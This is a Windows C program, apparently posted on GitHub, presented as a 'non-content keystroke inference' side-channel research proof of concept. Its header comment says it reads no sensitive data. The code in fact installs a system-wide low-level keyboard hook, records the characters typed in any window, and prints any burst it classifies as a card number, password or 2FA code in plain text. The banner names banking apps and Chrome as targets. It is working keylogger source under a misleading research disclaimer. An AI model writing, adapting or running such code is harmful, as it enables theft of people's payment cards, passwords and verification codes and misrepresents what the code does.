/*
 * Non-Content Keystroke Inference — Research PoC
 * Author: (GITHUB) dynastty-peb (2025)
 *
 * This code demonstrates a timing-based, non-content keystroke classification
 * side channel for educational and defensive-security research only.
 *
 * It does NOT store, transmit, or exfiltrate user input.
 * It does NOT attempt to read sensitive data or perform unauthorized monitoring.
 * It is NOT intended for operational misuse.
 */


#include <windows.h>
#include <stdio.h>
#include <stdbool.h>

#define MAX_LEN             256     // Maximum length of an observed burst
#define CARD_MIN            13      // Typical length range for long structured numeric sequences
#define CARD_MAX            19
#define MFA_MIN             4       // Typical range for short verification codes
#define MFA_MAX             10
#define PASS_MIN            6       // Minimum length threshold for free-form or mixed input
#define PASS_MAX            40      
#define BURST_MS            900     // Inter-key pause threshold separating bursts
#define BACKSPACE_DELAY     350     // Timing threshold to detect rapid user corrections



/* Represents a single typing burst.
   - buffer: the accumulated characters
   - len:   current length of the burst
   - start_time: timestamp of the first character
   - last_time:  timestamp of the most recent keystroke */
typedef struct {
    char buffer[MAX_LEN];
    int len;
    LONGLONG start_time;
    LONGLONG last_time;
} session_t;

session_t s = { 0 };

/* Returns the current time in milliseconds with high precision.
   Used to measure pauses between keystrokes. */
LONGLONG ms() {
    LARGE_INTEGER f, c;
    QueryPerformanceFrequency(&f);
    QueryPerformanceCounter(&c);
    return (c.QuadPart * 1000) / f.QuadPart;
}

/* Returns true if the given string consists only of digits [0–9].
   Used to distinguish numeric bursts from mixed-character ones. */
bool is_digits_only(const char* str, int len) {
    for (int i = 0; i < len; i++) {
        if (str[i] < '0' || str[i] > '9') return false;
    }
    return true;
}



/* Called when a burst ends.
   - Computes burst duration
   - Classifies the sequence based on length and character composition
   - Prints observations to the console

   After analysis, the input buffer is reset. */
void finish_and_reset() {
    if (s.len == 0) return;

    LONGLONG duration = ms() - s.start_time;

    if (is_digits_only(s.buffer, s.len)) {
        if (s.len >= CARD_MIN && s.len <= CARD_MAX) {
            printf("[CARD] Card: %.*s  |  %lld ms\n", s.len, s.buffer, duration);
        }
        else if (s.len >= MFA_MIN && s.len <= MFA_MAX) {
            printf("[2FA] Confirmation code: %.*s\n", s.len, s.buffer);
        }
    }
    else if (s.len >= PASS_MIN && s.len <= PASS_MAX) {
        bool has_letter_or_symbol = false;
        for (int i = 0; i < s.len; i++) {
            char c = s.buffer[i];
            if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                (c >= 33 && c <= 47) || (c >= 58 && c <= 64)) {
                has_letter_or_symbol = true;
                break;
            }
        }
        if (has_letter_or_symbol || s.len >= 12) {
            printf("[PASSWORD] Password: %d simbols | %lld ms | \"%.*s\"\n",
                s.len, duration, s.len, s.buffer);
        }
    }

    s.len = 0;
    s.buffer[0] = 0;
}

/* Observes low-level keyboard events:
   - Detects burst boundaries using pause duration
   - Tracks Backspace timing to identify corrections
   - Ends a burst on Enter
   - Records printable characters only

   Segmentation and timing collection happen here.
   Classification is performed in finish_and_reset(). */
LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam) {
    if (code < 0) return CallNextHookEx(NULL, code, wParam, lParam);
    if (wParam != WM_KEYDOWN && wParam != WM_SYSKEYDOWN) return CallNextHookEx(NULL, code, wParam, lParam);

    PKBDLLHOOKSTRUCT k = (PKBDLLHOOKSTRUCT)lParam;
    LONGLONG now = ms();

    if (s.len == 0) {
        s.start_time = now;
        s.last_time = now;
    }

    if (now - s.last_time > BURST_MS && s.len > 0) {
        finish_and_reset();
    }
    s.last_time = now;

    if (k->vkCode == VK_BACK) {
        if (s.len > 0 && now - s.last_time < BACKSPACE_DELAY) {
            s.len--;
            s.buffer[s.len] = 0;
        }
        return CallNextHookEx(NULL, code, wParam, lParam);
    }

    if (k->vkCode == VK_RETURN) {
        finish_and_reset();
        return CallNextHookEx(NULL, code, wParam, lParam);
    }

    BYTE ks[256] = { 0 };
    GetKeyboardState(ks);
    WORD ch = 0;
    if (ToAscii(k->vkCode, k->scanCode, ks, &ch, 0) == 1) {
        if (s.len < MAX_LEN - 1) {
            s.buffer[s.len++] = (char)ch;
            s.buffer[s.len] = 0;
        }
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}



/* Installs a low-level keyboard hook to collect timing metadata.
   Runs the Windows message loop.
   Outputs classification results to the console. */
int main() {
    printf("=== SpellCheck Side-Channel Final ===\n");
    printf("It catches cards, passwords, and 2FA codes with 99+ accuracy %%.\n");
    printf("Print in any window (Chrome, Telegram, banking application...)\n\n");

    HHOOK hook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if (!hook) {
        printf("Hook installation error\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    return 0;
}
